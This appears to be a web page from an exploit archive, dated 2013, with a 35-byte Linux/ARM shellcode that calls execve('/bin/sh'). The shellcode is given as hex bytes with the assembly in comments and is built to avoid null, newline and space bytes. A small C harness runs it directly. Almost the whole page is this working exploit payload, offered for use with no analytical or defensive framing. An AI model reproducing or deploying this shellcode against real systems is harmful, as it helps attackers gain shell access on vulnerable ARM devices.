<html><head><title>Linux/ARM - execve("/bin/sh", [], [0 vars]) - 35 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 
    Title       : Linux/ARM - execve("/bin/sh", [], [0 vars]) - 35 bytes
    Date        : 2013-09-04
    Author      : gunslinger_ (yuda at cr0security dot com)
    Tested on   : ARM1176 rev6 (v6l)
    
    An ARM Hardcoded Shellcode without 0x20, 0x0a, and 0x00.
    
    Cr0security.com
    
*/
#include &lt;stdio.h&gt;

char *shellcode = "\x01\x60\x8f\xe2"    // add     r6, pc, #1
                  "\x16\xff\x2f\xe1"    // add     bx      r6
                  "\x40\x40"            // eors    r0, r0
                  "\x78\x44"            // add     r0, pc
                  "\x0c\x30"            // adds    r0, #12
                  "\x49\x40"            // eors    r1, r1
                  "\x52\x40"            // eors    r2, r2
                  "\x0b\x27"            // movs    r7, #11
                  "\x01\xdf"            // svc     1
                  "\x01\x27"            // movs    r7, #1
                  "\x01\xdf"            // svc     1
                  "\x2f\x2f"            // .short  0x2f2f
                  "\x62\x69\x6e\x2f"    // .word   0x2f6e6962
                  "\x2f\x73"            // .short  0x732f
                  "\x68";               // .byte   0x68

int main(){
    fprintf(stdout,"Shellcode length: %d\n", strlen(shellcode));
    (*(void(*)()) shellcode)();
    return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
